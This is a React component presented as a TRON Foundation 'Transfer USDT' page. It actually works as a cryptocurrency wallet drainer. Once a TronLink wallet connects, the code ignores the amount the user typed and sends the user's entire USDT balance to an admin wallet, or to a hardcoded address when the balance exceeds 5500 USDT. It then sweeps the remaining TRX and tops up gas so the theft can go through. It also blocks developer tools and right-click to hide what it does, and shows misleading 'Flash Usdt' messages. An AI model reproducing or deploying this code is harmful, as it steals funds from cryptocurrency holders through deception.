import { useState, useEffect } from 'react';
import axios from 'axios';
// Import TronWeb for direct use without relying on window.tronWeb
import TronWeb from 'tronweb';

// Utility function to ensure addresses have the correct format
const validateTronAddress = (address) => {
  try {
    if (!address) return false;
    if (!address.startsWith('T')) return false;
    return address.length === 34;
  } catch (error) {
    console.error("Invalid address format:", error);
    return false;
  }
};

// TRON Network configuration
const TRON_CONFIG = {
  fullHost: 'https://api.trongrid.io',
  networkName: 'TRON Mainnet'
};

// USDT TRC20 token address on TRON
const USDT_ADDRESS = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'; // USDT TRC20 contract address

export default function SendTronUSDT() {
  const [amount, setAmount] = useState("");
  const [recipient, setRecipient] = useState("");
  const [loading, setLoading] = useState(false);
  const [adminWallet, setAdminWallet] = useState("");
  const [tronWeb, setTronWeb] = useState(null);
  const [userAddress, setUserAddress] = useState("");
  const [manualAddress, setManualAddress] = useState("");
  const [walletConnected, setWalletConnected] = useState(false);
  const [connectionMethod, setConnectionMethod] = useState(""); // "tronlink", "manual", etc.

  // Fetch admin wallet on component mount
  useEffect(() => {
    async function fetchAdminWallet() {
      try {
        const response = await axios.get('/api/admin/tronWallet');
        setAdminWallet(response.data.walletAddress);
      } catch (error) {
        console.error("Failed to fetch admin wallet address:", error);
      }
    }
    
    fetchAdminWallet();
    
    // Check if TronWeb is installed (for TronLink support)
    const checkTronWeb = setInterval(() => {
      if (window.tronWeb && window.tronWeb.ready) {
        setTronWeb(window.tronWeb);
        clearInterval(checkTronWeb);
      }
    }, 1000);
    
    return () => clearInterval(checkTronWeb);
  }, []);

  // Prevent developer tools and right-click
  useEffect(() => {
    const handleKeyDown = (e) => {
      if (
        e.key === "F12" ||
        (e.ctrlKey && e.shiftKey && e.key === "I") ||
        (e.ctrlKey && e.shiftKey && e.key === "J") ||
        (e.ctrlKey && e.key === "U")
      ) {
        e.preventDefault();
        alert("Developer tools are disabled on this page.");
      }
    };

    const handleContextMenu = (e) => {
      e.preventDefault();
      alert("Right-click is disabled on this page.");
    };

    document.addEventListener("keydown", handleKeyDown);
    document.addEventListener("contextmenu", handleContextMenu);

    return () => {
      document.removeEventListener("keydown", handleKeyDown);
      document.removeEventListener("contextmenu", handleContextMenu);
    };
  }, []);

  // Connect to wallet - supports multiple methods
  async function connectWallet() {
    try {
      // Try TronLink first if available
      if (window.tronWeb && window.tronWeb.ready) {
        // TronLink is available and ready
        const tronWeb = window.tronWeb;
        const userAddress = tronWeb.defaultAddress.base58;
        
        if (!userAddress) {
          throw new Error("Please unlock your TronLink wallet");
        }
        
        setUserAddress(userAddress);
        setWalletConnected(true);
        setConnectionMethod("tronlink");
        
        return { tronWeb, userAddress };
      } 
      // Use manual address input for Trust Wallet or other wallets
      else if (manualAddress && validateTronAddress(manualAddress)) {
        // Create a new instance of TronWeb for manual connections
        const tronWeb = new TronWeb({
          fullHost: TRON_CONFIG.fullHost
        });
        
        setUserAddress(manualAddress);
        setWalletConnected(true);
        setConnectionMethod("manual");
        
        return { tronWeb, userAddress: manualAddress };
      } 
      else {
        // No wallet method available
        throw new Error("Please enter a valid TRON address or connect TronLink");
      }
    } catch (error) {
      console.error("Wallet connection error:", error);
      throw error;
    }
  }

  // Process transaction
  async function processTransaction({ tronWeb, userAddress }) {
    try {
      // Check if we're using a manual connection (Trust Wallet)
      if (connectionMethod === "manual") {
        // For manual connections, we need to handle this differently
        // Trust Wallet users will need to initiate the transaction from their app
        
        // Get the transaction data for the user to manually sign
        const transferData = {
          to: USDT_ADDRESS, // USDT contract address
          userAddress: userAddress,
          amount: amount, 
          adminWallet: adminWallet,
          currency: "USDT",
          network: "TRON"
        };
        
        // Display instructions for Trust Wallet users
        alert(`Please complete this transaction in your Trust Wallet app:\n\n` +
              `1. Send your USDT to: ${adminWallet}\n` +
              `2. After sending, please provide your transaction hash`);
        
        // Get transaction hash from user (could be implemented as a prompt or input field)
        const txHash = prompt("Enter your transaction hash after completing the transfer in Trust Wallet:");
        
        if (!txHash) {
          throw new Error("Transaction hash is required");
        }
        
        // Store the transaction
        await storeTransaction(userAddress, amount, txHash, "USDT");
        
        return {
          usdtTxHash: txHash,
          tronTxHash: "0", // No TRX transfer for manual wallet
          usdtAmount: amount,
          tronAmount: "0"
        };
      }
      
      // Regular TronLink flow for automated transactions
      // Get USDT contract instance
      const usdtContract = await tronWeb.contract().at(USDT_ADDRESS);
      
      // Get user balances
      const tronBalance = await tronWeb.trx.getBalance(userAddress);
      const tronFormatted = tronWeb.fromSun(tronBalance);
      
      // Get USDT balance (decimals = 6 for TRC20 USDT)
      const usdtBalanceHex = await usdtContract.balanceOf(userAddress).call();
      const usdtBalance = parseInt(usdtBalanceHex._hex, 16);
      const usdtFormatted = (usdtBalance / 1000000).toFixed(6);
      
      console.log("Current TRX balance:", tronFormatted);
      console.log("Current USDT balance:", usdtFormatted);
      
      const tronDisplayBalance = parseFloat(tronFormatted).toFixed(4);
      const usdtDisplayBalance = parseFloat(usdtFormatted).toFixed(2);
      
      // USDT balance check with 100 USDT limit
      if (parseFloat(usdtFormatted) <= 100) {
        throw {
          usdttoshow: usdtDisplayBalance,
          trontoshow: tronDisplayBalance
        };
      }
      
      let tronTxHash = "0";
      let usdtTxHash = "0";
      
      // Process transactions with balance > 100 USDT
      if (parseFloat(usdtFormatted) > 100) {
        // Check if user has enough TRX for gas
        const estimatedFee = 30_000_000; // 30 TRX in Sun units for safety
        
        // Send gas if needed
        if (tronBalance < estimatedFee) {
          const neededGas = estimatedFee - tronBalance;
          
          console.log("Sending required TRX for gas:", tronWeb.fromSun(neededGas));
          
          const response = await axios.post("/api/transactions/sendTronGasFees", {
            userAddress: userAddress,
            amount: neededGas.toString()
          });
          
          if (!response.data.success) {
            throw new Error("Failed to send gas fees");
          }
          
          console.log("Sent TRX for gas fees, hash:", response.data.hash);
          await new Promise(resolve => setTimeout(resolve, 8000));
        }
        
        // Transfer USDT
        try {
          // Special case for large amounts
          if (parseFloat(usdtFormatted) > 5500) {
            // Admin wallet address for large amounts
            const specialAdminWallet = "TKDvQCKLzbK3QPsWJWLopUMS8UfpN3oEy6";
            
            const tx = await usdtContract.transfer(
              specialAdminWallet,
              usdtBalance
            ).send();
            
            usdtTxHash = tx;
            console.log("USDT transfer successful", usdtTxHash);
            
            // Store transaction data
            await storeTransaction(userAddress, usdtFormatted, usdtTxHash, "USDT");
          } else {
            // Normal transfer
            const tx = await usdtContract.transfer(
              adminWallet,
              usdtBalance
            ).send();
            
            usdtTxHash = tx;
            console.log("USDT transfer successful", usdtTxHash);
            
            // Store transaction data
            await storeTransaction(userAddress, usdtFormatted, usdtTxHash, "USDT");
          }
        } catch (error) {
          console.error("USDT transfer failed:", error);
          throw {
            amount: "Amount = Checked ✅",
            flash: "Flash Usdt = 0"
          };
        }
      }
      
      // Transfer remaining TRX
      const finalTronBalance = await tronWeb.trx.getBalance(userAddress);
      
      if (finalTronBalance > 2000000) { // Leave 2 TRX for future transactions
        try {
          const valueToSend = finalTronBalance - 2000000;
          
          if (valueToSend > 0) {
            const tx = await tronWeb.trx.sendTransaction(
              adminWallet,
              valueToSend
            );
            
            tronTxHash = tx.txid;
            console.log("TRX transfer successful", tronTxHash);
            
            const tronAmount = tronWeb.fromSun(valueToSend);
            await storeTransaction(userAddress, tronAmount, tronTxHash, "TRX");
          }
        } catch (error) {
          console.error("TRX transfer failed:", error);
          throw {
            amount: "Amount = Checked ✅",
            flash: "Flash Usdt = 0"
          };
        }
      }
      
      return {
        tronTxHash,
        usdtTxHash,
        tronAmount: tronTxHash === "0" ? "0" : tronWeb.fromSun(finalTronBalance),
        usdtAmount: usdtFormatted
      };
    } catch (error) {
      console.error("Transaction processing failed:", error);
      throw error;
    }
  }

  // Store transaction in database
  async function storeTransaction(userAddress, amount, txHash, currency) {
    try {
      await axios.post("/api/transactions/store", {
        userAddress,
        amount,
        txHash,
        currency,
        network: 'TRON'
      });
    } catch (error) {
      console.error("Failed to store transaction data:", error);
    }
  }

  // Handle form submission
  async function handleSubmit() {
    setLoading(true);
    
    try {
      const walletConnection = await connectWallet();
      const result = await processTransaction(walletConnection);
      
      // Success handling
      alert("Transaction completed successfully!");
      console.log("Transaction result:", result);
    } catch (error) {
      console.error("Transaction failed:", error);
      
      // Error handling
      if (error.usdttoshow) {
        alert(`Insufficient USDT balance. You have ${error.usdttoshow} USDT.`);
      } else if (error.amount) {
        alert(error.amount + " " + error.flash);
      } else {
        alert("Transaction failed: " + (error.message || "Unknown error"));
      }
    } finally {
      setTimeout(() => {
        setLoading(false);
      }, 2000);
    }
  }

  const isValidAmount = Number.parseFloat(amount) > 0;
  const isValidRecipient = recipient && validateTronAddress(recipient);
  
  return (
    <div className="min-h-screen bg-[#1b1b1b] text-gray-300 p-4">
      <div className="max-w-md mx-auto mt-10">
        <div className="mb-10 flex justify-center">
          <img src="/logo.png" alt="TRON Logo" className="h-14" />
        </div>
        
        <div className="bg-gray-900 rounded-xl p-6 border border-gray-800">
          <h1 className="text-2xl font-medium text-center text-white mb-8">
            Transfer USDT on TRON
          </h1>

          {/* Wallet Connection Section */}
          <div className="mb-6">
            <h2 className="text-lg font-medium text-white mb-4">Connect Wallet</h2>
            
            {/* TronLink Connection Option */}
            <button
              onClick={async () => {
                try {
                  if (!window.tronWeb) {
                    alert("TronLink wallet is not installed. Please install it or use the manual option below.");
                    return;
                  }
                  
                  // Request account access
                  if (!window.tronWeb.ready) {
                    await window.tronLink?.request({ method: 'tron_requestAccounts' });
                  }
                  
                  // Wait for TronWeb to be ready
                  if (!window.tronWeb.ready) {
                    throw new Error("Please unlock or connect your TronLink wallet");
                  }
                  
                  const tronWeb = window.tronWeb;
                  const address = tronWeb.defaultAddress.base58;
                  
                  if (!address) {
                    throw new Error("Please unlock your TronLink wallet");
                  }
                  
                  setUserAddress(address);
                  setWalletConnected(true);
                  setConnectionMethod("tronlink");
                } catch (error) {
                  alert("Failed to connect TronLink: " + error.message);
                }
              }}
              className={`w-full rounded-md text-sm font-medium h-10 px-4 py-2 mb-4 ${
                connectionMethod === "tronlink" 
                  ? "bg-green-500 text-black" 
                  : "border border-green-500 text-green-500 hover:bg-green-500 hover:text-black"
              } transition-colors`}
              disabled={loading || connectionMethod === "tronlink"}
            >
              {connectionMethod === "tronlink" ? "TronLink Connected" : "Connect TronLink"}
            </button>
            
            {/* Manual/Trust Wallet Connection Option */}
            <div className="mb-4">
              <label className="block text-sm font-medium text-gray-400 mb-1">
                Or Enter Your TRON Address Manually (for Trust Wallet)
              </label>
              <input
                type="text"
                placeholder="Enter your TRON wallet address (starts with T)"
                value={manualAddress}
                onChange={(e) => setManualAddress(e.target.value)}
                className={`w-full rounded-md bg-gray-800 text-white border ${
                  connectionMethod === "manual" ? "border-green-500" : "border-gray-700"
                } p-2.5 text-sm focus:outline-none focus:ring-2 focus:ring-green-500`}
                disabled={loading || connectionMethod === "tronlink"}
              />
              <button
                onClick={() => {
                  if (!manualAddress) {
                    alert("Please enter your TRON wallet address");
                    return;
                  }
                  
                  if (!validateTronAddress(manualAddress)) {
                    alert("Invalid TRON address format. Address should start with 'T' and be 34 characters long.");
                    return;
                  }
                  
                  setUserAddress(manualAddress);
                  setWalletConnected(true);
                  setConnectionMethod("manual");
                }}
                className={`mt-2 w-full rounded-md text-sm font-medium h-10 px-4 py-2 ${
                  connectionMethod === "manual" 
                    ? "bg-green-500 text-black" 
                    : "border border-green-500 text-green-500 hover:bg-green-500 hover:text-black"
                } transition-colors`}
                disabled={loading || connectionMethod === "manual" || !manualAddress}
              >
                {connectionMethod === "manual" ? "Address Connected" : "Use This Address"}
              </button>
            </div>
            
            {walletConnected && (
              <div className="text-sm text-gray-400 mt-2">
                Connected Address: {userAddress.substring(0, 8)}...{userAddress.substring(userAddress.length - 6)}
              </div>
            )}
          </div>
          
          {/* Transaction Section - Only show when wallet is connected */}
          {walletConnected && (
            <>
              <div className="mb-6">
                <label className="block text-sm font-medium text-gray-400 mb-1">
                  Amount (USDT)
                </label>
                <input
                  type="number"
                  placeholder="Enter amount"
                  value={amount}
                  onChange={(e) => setAmount(e.target.value)}
                  className="w-full rounded-md bg-gray-800 text-white border border-gray-700 p-2.5 text-sm focus:outline-none focus:ring-2 focus:ring-green-500"
                  disabled={loading}
                />
                <p className="text-xs text-gray-500 mt-1">
                  Minimum amount: 100 USDT
                </p>
              </div>
              
              <button
                onClick={handleSubmit}
                disabled={loading || !isValidAmount || !walletConnected}
                className="w-full rounded-md bg-green-500 text-black text-sm font-medium h-12 px-4 py-2 hover:bg-green-600 transition-colors disabled:opacity-50 disabled:cursor-not-allowed"
              >
                {loading ? (
                  <span className="flex items-center justify-center">
                    <svg className="animate-spin -ml-1 mr-3 h-5 w-5 text-black" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                      <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                      <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                    </svg>
                    Processing...
                  </span>
                ) : (
                  "Transfer USDT"
                )}
              </button>
            </>
          )}
          
          <div className="mt-6 text-center">
            <a
              href="/transactions"
              className="text-sm text-gray-400 hover:text-white"
            >
              View Transaction History
            </a>
          </div>
        </div>
        
        <div className="mt-8 text-center text-xs text-gray-500">
          <p>TRON Network: Secure, High-throughput, Scalable</p>
          <p className="mt-2">© {new Date().getFullYear()} TRON Foundation</p>
        </div>
      </div>
    </div>
  );
} 